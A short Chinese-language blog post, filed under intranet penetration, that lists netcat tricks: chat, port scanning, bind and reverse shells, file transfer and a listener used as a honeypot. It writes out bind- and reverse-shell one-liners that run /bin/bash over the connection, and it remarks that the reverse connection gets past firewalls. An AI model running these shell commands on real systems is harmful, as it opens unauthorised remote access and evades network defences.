---
title: "netcat 使用技巧"
date: 2018-02-14T00:00:00+08:00
draft: false
tags: ['windows','linux']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

netcat 是一个用于 TCP/UDP 连接和监听的 linux 工具, 主要用于网络传输及调试领域.

<!--more-->

## 聊天室

`Server: nc -l -p port`

`Client: nc ip port`

此时在 client 输入任何内容都会在 server 中显示

## 端口扫描

`nc -v ip port`

`nc -v ip port-port`

参数

```
-v 详细输出 -vv 更详细
-w sec 设置超时时间 单位秒
-z 在扫描端口后立即关闭连接
```

ex

`nc -vv -w 3 -z 10.0.0.1 1-65535`

## 正向连接

`Server: nc -l -p port -e /bin/bash`

`Client: nc ip port`

参数

```
-e 连接后执行的程序
```

client 连接 server

有时会被防火墙拦截

## 反向连接

`Client: nc -vv -l -p port`

`Server: nc -e /bin/bash ip port`

server 连接 client

不会被防火墙拦截

## 数据传输

**发送**

`Client: nc ip port < file`

`Server: nc -d -l -p port > file`

参数

```
< 输入重定向
> 输出重定向
```

**接收**

`Server: nc -d -l -p port < file`

`Client: nc ip port > file`

## 蜜罐

`nc -L -p port`

参数

```
-L 持续监听
```